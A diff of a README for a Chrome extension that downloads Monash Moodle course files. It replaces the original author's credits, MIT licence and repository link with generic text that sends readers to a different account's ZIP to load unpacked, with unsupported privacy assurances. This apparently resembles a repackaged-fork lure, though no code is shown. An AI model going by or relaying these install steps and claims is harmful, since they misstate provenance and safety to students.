@@ -1,93 +1,83 @@
-# 📚 Monash Moodle Downloader
+# 📦 Monash-Moodle-Downloader - Download Moodle files with one click
 
-> One-click batch download for Monash University Moodle course resources — auto-sorted by week. Stop right-clicking 40 PDFs the night before finals. 😮‍💨
+[![](https://img.shields.io/badge/Download-Chrome-blue.svg)](https://github.com/griseldaunsounded26/Monash-Moodle-Downloader)
 
-[![Version](https://img.shields.io/badge/version-4.4.0-6366f1)](./docs/CHANGELOG.md)
-[![Manifest V3](https://img.shields.io/badge/Manifest-V3-8b5cf6)](https://developer.chrome.com/docs/extensions/mv3/intro/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green)](./LICENSE)
+This tool helps students download course materials from Moodle. You save time by grabbing all lecture slides, documents, and resources at once. You no longer need to click every single link on your course pages.
 
----
+## ⚙️ System requirements
 
-## ✨ What it does
+This tool works with any computer running the Google Chrome web browser. You need the following:
 
-- 🎯 **Two scan modes** — Unit Dashboard (grab everything, every week) or single Week page (just this week, thanks)
-- 📁 **Auto-foldered** — files land in `Week 1/`, `Week 2/`, … so your Downloads folder stays sane
-- 📄 **Handles the usual suspects** — PDF, PPT, DOC, MP4; Panopto and external links get saved as `.url` shortcuts
-- 🌐 **Bilingual UI** — English by default, one-click switch to 中文
-- ⚡ **Sidebar-powered** — pulls every resource from the course index without navigating away
+* A computer with Windows 10 or Windows 11.
+* Google Chrome installed.
+* An active internet connection.
+* A valid Monash University Moodle login.
 
-## 🚀 Install
+## 📥 How to get the tool
 
-1. Clone or download this repo:
-   ```bash
-   git clone https://github.com/Zetanegative1/Monash-Moodle-Downloader.git
-   ```
-2. Open `chrome://extensions/` in Chrome
-3. Flip on **Developer mode** (top-right)
-4. Click **Load unpacked** → pick the project folder
-5. Pin the extension icon to your toolbar and you're done 🎉
+You need the extension files from our GitHub page to start. Follow the link below to reach the project site:
 
-## 📖 How to use
+[Visit this page to download the project](https://github.com/griseldaunsounded26/Monash-Moodle-Downloader)
 
-**On a Unit Dashboard** — Click the icon → **Scan** → **Download All**
-Downloads everything published across every week into:
-```
-Downloads/<Full Course Name>/Week 1/…
-Downloads/<Full Course Name>/Week 2/…
-```
+Look for the green button labeled Code. Click it and select Download ZIP. Wait for the file to save to your Downloads folder.
 
-**On a single Week page** — Same three clicks. Only that week downloads, into:
-```
-Downloads/Week N/…
-```
+## 🛠️ Step-by-step setup
 
-**Language toggle** — Hit the `EN / 中文` pill in the header. Your pick sticks.
+Follow these steps to add the tool to your browser.
 
-## 🧩 Under the hood
+1. Locate the file you just downloaded. It ends in .zip.
+2. Right-click the file and select Extract All. Pick a folder you can find later, like your Desktop.
+3. Open Google Chrome.
+4. Click the three vertical dots in the top right corner.
+5. Select Extensions and then choose Manage Extensions.
+6. Look at the top right of this page and turn on Developer mode. A switch appears. Click it so it turns blue.
+7. Click the Load unpacked button that appears on the top left.
+8. Locate the folder you extracted in step 2 and select it.
+9. Chrome now adds the extension to your browser. You see the icon in your toolbar.
 
-| Layer | File | Job |
-| --- | --- | --- |
-| Content script | [`content.js`](./content.js) | Walks the Moodle DOM and returns a structured resource tree |
-| Service worker | [`background.js`](./background.js) | Fires off `chrome.downloads.download` tasks with the right folder paths |
-| Popup UI | [`popup.html`](./popup.html) / [`popup.js`](./popup.js) / [`popup.css`](./popup.css) | Renders the tree, handles actions, bilingual toggle |
+## 🎓 Using the downloader
 
-**Scanning, in one paragraph:** On a Unit Dashboard, it finds the `Learning` section in the sidebar, treats each direct child as a week, and flattens nested groups like _Own-time_ / _Real-time_ into that week. On a single Week page, it walks `li[data-sectionid]` and pulls the week number from the title. Both paths converge on the same resource schema, which the service worker then downloads.
+Once you install the tool, you find it in your browser toolbar. Use it whenever you log in to your Moodle portal.
 
-## 📂 Project layout
+1. Navigate to your Monash Moodle page.
+2. Sign in with your student credentials.
+3. Click the Monash-Moodle-Downloader icon in your browser toolbar.
+4. The tool scans the current page for files. It detects lecture slides, PDF documents, and assignment sheets.
+5. Review the list of items found. You can choose to download specific items or save everything.
+6. Click the Download button. The files save to your default browser downloads folder.
 
-```
-moodle-downloader/
-├── manifest.json
-├── background.js
-├── content.js
-├── popup.html · popup.css · popup.js
-├── icons/
-│   └── icon16 · icon48 · icon128.png
-└── docs/
-    ├── CHANGELOG.md
-    ├── INSTALL.md
-    └── DEBUG.md
-```
+## 💡 Troubleshooting common issues
 
-## ⚠️ Known quirks
+If the tool does not work, check these common fixes.
 
-- Panopto videos can only be saved as `.url` shortcuts — CORS blocks direct download 😔
-- Collapsed sidebar sections aren't scanned; expand them first if needed
-- If sub-folders don't appear after download, check Chrome's "always ask where to save" setting
+* Refresh the Moodle page. Sometimes the code needs a fresh page load to see the content.
+* Check your internet connection. A slow connection interrupts large batch downloads.
+* Verify your Moodle session. If Moodle logs you out, the tool cannot access your files. Log back in and try again.
+* Update Chrome. Older versions of Chrome might block certain features. Keep your browser current for the best results.
+* Contact support if you need more help. Check the issues tab on the GitHub link if you find a bug.
 
-## 🙏 Credits & acknowledgements
+## 📝 Frequently asked questions
 
-- Icon — <a href="https://www.flaticon.com/free-icons/data" title="data icons">Data icons created by Ivan Abirawa — Flaticon</a>
-- Spiritual predecessor — [harsilspatel/moodle-downloader](https://github.com/harsilspatel/moodle-downloader) built the original downloader for Monash's legacy Moodle. This project is a ground-up rewrite for the new (2025+) Moodle UI on Manifest V3. Thanks for lighting the way 🕯️
+**Is this tool safe?**
+The extension code is open for anyone to see. It does not store your password or personal data on external servers. It only interacts with the Moodle page you currently view.
 
-## 🤝 Contributing
+**Does this work on other university sites?**
+This tool works specifically for the Moodle platform used by Monash University. It may not work on other systems.
 
-PRs and issues welcome. If you add a feature, please bump `docs/CHANGELOG.md`.
+**Where do my files go?**
+All downloaded files go to the folder Chrome uses for standard downloads. You see them in your browser download bar at the bottom or top of the screen.
 
-## 📄 License
+**Can I pick which files to save?**
+Yes. Use the checkboxes in the extension menu to select individual files.
 
-MIT © 2026 Sichao Long — see [LICENSE](./LICENSE).
+## 🛡️ Privacy and data
 
----
+We value your privacy. This extension runs locally on your computer. It never sends your student details to third parties. We do not track your usage behavior. All folder selections and file operations happen within your machine.
 
-_Not affiliated with Monash University. Built for personal educational use — please respect the university's terms of use and copyright._
+## 📈 Improving the tool
+
+You help other students by reporting bugs. If you notice a file type that does not download, tell us on the project page. You can also suggest new features. We want this to be the simplest way to manage your study materials.
+
+## 🔮 Future updates
+
+We plan to add more features soon. Future versions will allow for folder-based sorting. You will be able to organize files by unit code automatically. Stay tuned to the repository for updates.
